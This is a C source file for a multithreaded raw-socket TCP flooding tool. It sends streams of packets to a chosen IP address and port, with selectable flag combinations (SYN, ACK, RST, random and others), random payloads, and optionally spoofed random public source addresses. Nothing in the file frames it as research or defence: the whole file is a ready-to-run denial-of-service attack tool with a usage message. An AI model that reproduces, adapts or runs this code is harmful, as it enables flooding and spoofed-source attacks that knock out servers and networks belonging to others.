#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <stdint.h>

#define MAX_PACKET_SIZE 99999
#define DEFAULT_TTL 255
#define MAX_PAYLOAD_SIZE 1460
#define SIZE_ARRAY(x) (sizeof(x) / sizeof(x[0]))

const char *all_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";

char getRandomChar() {
    return all_chars[rand() % strlen(all_chars)];
}

char *generate_payload(int size) {
    if (size <= 0) return NULL;

    char *payload = malloc(size + 1);
    if (!payload) return NULL;

    for (int i = 0; i < size; i++) {
        payload[i] = getRandomChar();
    }
    payload[size] = '\0';
    return payload;
}

struct thread_args {
    char dest_ip[INET_ADDRSTRLEN];
    int dest_port;
    int payload_len;
    char source_ip[INET_ADDRSTRLEN];
    char flags[100];
    char *payload;
    int seconds;
    int limiter;
};

struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

char* generate_public_ip() {
    int first_octet  = rand() % 256;
    int second_octet = rand() % 256;
    int third_octet  = rand() % 256;
    int fourth_octet = rand() % 256;

    if (first_octet == 10 ||
        (first_octet == 172 && second_octet >= 16 && second_octet <= 31) ||
        (first_octet == 192 && second_octet == 168)) {
        return generate_public_ip();
    }

    char* ip = malloc(16 * sizeof(char));
    sprintf(ip, "%d.%d.%d.%d", first_octet, second_octet, third_octet, fourth_octet);
    return ip;
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned long sum = 0;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len) {
        sum += *((unsigned char *)buf);
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (unsigned short)(~sum);
}

unsigned short tcp_checksum(void *datagram, int segment_len, struct iphdr *iph, struct tcphdr *tcph) {
    char buf[MAX_PACKET_SIZE];
    struct pseudo_header psh;

    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(segment_len);

    memset(buf, 0, sizeof(buf));
    memcpy(buf, &psh, sizeof(psh));
    memcpy(buf + sizeof(psh), tcph, segment_len);

    return checksum(buf, sizeof(psh) + segment_len);
}

void setup_headers(struct iphdr *iph, struct tcphdr *tcph, struct thread_args *args) {
    memset(iph, 0, sizeof(struct iphdr));
    memset(tcph, 0, sizeof(struct tcphdr));

    char *public_ip = generate_public_ip();
    int is_random = strstr(args->source_ip, "-1") != NULL;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htonl(rand());
    iph->frag_off = 0;
    iph->ttl = DEFAULT_TTL;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = is_random ? inet_addr(public_ip) : inet_addr(args->source_ip);
    iph->daddr = inet_addr(args->dest_ip);
    iph->check = 0;

    tcph->source = htons(rand() % 65535);
    tcph->dest = htons(args->dest_port);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->window = htons(rand() % 65535);

    free(public_ip);
}

void send_flag(int sock, struct thread_args *args, struct iphdr *iph, struct tcphdr *tcph, const char *flags, const char *data, int data_len) {
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(args->dest_port);
    dest.sin_addr.s_addr = inet_addr(args->dest_ip);

    for (int i = 0; flags[i] != '\0'; i++) {
        setup_headers(iph, tcph, args);

        tcph->syn = 0;
        tcph->ack = 0;
        tcph->psh = 0;
        tcph->rst = 0;
        tcph->fin = 0;
        tcph->urg = 0;

        switch (flags[i]) {
            case 'S': tcph->syn = 1; break;
            case 'A': tcph->ack = 1; break;
            case 'P': tcph->psh = 1; break;
            case 'R': tcph->rst = 1; break;
            case 'F': tcph->fin = 1; break;
            case 'U': tcph->urg = 1; break;
            case 'Z': {
                tcph->syn = rand() % 2;
                tcph->ack = rand() % 2;
                tcph->psh = rand() % 2;
                tcph->rst = rand() % 2;
                tcph->urg = rand() % 2;
                break;
            }
            case 'X': {
                tcph->ack = 1;
                tcph->rst = 1;
                break;
            }
            case 'Y': {
                tcph->syn = 1;
                tcph->ack = 1;
                break;
            }
            case 'W': {
                tcph->psh = 1;
                tcph->ack = 1;
                break;
            }
            case 'V': {
                tcph->fin = 1;
                tcph->ack = 1;
                break;
            }
            case 'Q': {
                tcph->rst = 1;
                tcph->ack = 1;
                break;
            }
        }

        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);

        memcpy((char *)tcph + sizeof(struct tcphdr), data, data_len);

        iph->check = 0;
        iph->check = checksum(iph, iph->ihl * 4);
        tcph->check = 0;
        tcph->check = tcp_checksum(iph, tcph->doff * 4 + data_len, iph, tcph);

        sendto(sock, iph, ntohs(iph->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest));
    }
}

void *send_packets(void *arguments) {
    struct thread_args *args = (struct thread_args *)arguments;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        free(args);
        return NULL;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        close(sock);
        free(args);
        return NULL;
    }

    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    setup_headers(iph, tcph, args);

    char *flag_ptr = args->flags;
    time_t start = time(NULL);
    while (time(NULL) - start < args->seconds) {
        send_flag(sock, args, iph, tcph, flag_ptr, args->payload, args->payload_len);

        usleep(args->limiter);
    }

    close(sock);
    free(args->payload);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    srand(time(0));
    if (argc < 8) {
        fprintf(stderr, "Usage: %s ip port threads source_ip payload_len flags seconds limiter\n", argv[0]);
        printf(
            "Available flags:\n"
            "  S: SYN\n"
            "  A: ACK\n"
            "  P: PSH\n"
            "  R: RST\n"
            "  F: FIN\n"
            "  U: URG\n"
            "  Z: Random\n"
            "  X: ACK + RST\n"
            "  Y: SYN + ACK\n"
            "  W: PSH + ACK\n"
            "  V: FIN + ACK\n"
            "  Q: RST + ACK\n"
        );
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    char *source_ip = argv[4];
    int payload_len = atoi(argv[5]);
    char *flags = argv[6];
    int seconds = atoi(argv[7]);
    int limiter = atoi(argv[8]);

    if (limiter < 1) {
        fprintf(stderr, "Limiter must be greater than 0\n");
        return 1;
    }

    if (payload_len > MAX_PAYLOAD_SIZE) {
        fprintf(stderr, "Payload length exceeds maximum size of %d\n", MAX_PAYLOAD_SIZE);
        return 1;
    }

    char *payload = generate_payload(payload_len);

    pthread_t thread_id[threads];

    for (int i = 0; i < threads; i++) {
        struct thread_args *args = malloc(sizeof(struct thread_args));
        if (args == NULL) {
            fprintf(stderr, "Failed to allocate memory for thread arguments\n");
            continue;
        }
        strcpy(args->dest_ip, ip);
        args->dest_port = port;
        args->payload_len = payload_len;
        args->seconds = seconds;
        args->limiter = limiter;
        args->payload = strdup(payload);
        strcpy(args->source_ip, source_ip);
        strcpy(args->flags, flags);

        if (pthread_create(&thread_id[i], NULL, send_packets, (void *)args) != 0) {
            fprintf(stderr, "Error creating thread\n");
            free(args);
            continue;
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_id[i], NULL);
    }

    free(payload);

    return 0;
}